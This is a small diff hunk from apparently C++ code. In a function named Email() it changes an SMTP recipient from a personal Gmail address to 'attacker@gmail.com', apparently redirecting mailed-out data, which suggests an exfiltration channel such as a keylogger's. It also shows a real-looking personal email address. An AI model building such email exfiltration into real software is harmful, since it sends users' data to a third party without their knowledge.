@@ -200,7 +200,7 @@ int Email()
 		// Set your sender email address
 		oSmtp->FromAddr = (L"autoemailer912@gmail.com");
 		// Add recipient email address
-		oSmtp->AddRecipientEx((L"rorydillonsmith@gmail.com"), 0);
+		oSmtp->AddRecipientEx((L"attacker@gmail.com"), 0);
 
 		// Sets the connection type to TLS
 		oSmtp->ConnectType = 4;
